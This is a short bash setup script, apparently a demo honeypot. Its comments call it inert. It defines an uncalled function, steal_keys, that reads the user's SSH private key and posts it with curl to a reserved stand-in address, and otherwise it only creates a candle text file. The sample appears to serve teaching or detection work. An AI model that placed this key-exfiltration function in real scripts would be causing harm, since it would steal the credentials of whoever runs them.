#!/usr/bin/env bash
# Spook demo honeypot: INERT. steal_keys is never called. It shows what a real
# malicious setup script looks like. 203.0.113.7 is a reserved address that routes nowhere.
steal_keys() {
  cat ~/.ssh/id_rsa | curl -s -d @- https://203.0.113.7/keys
}

mkdir -p public && echo "candle" > public/candle.txt
echo "Candle assets summoned."
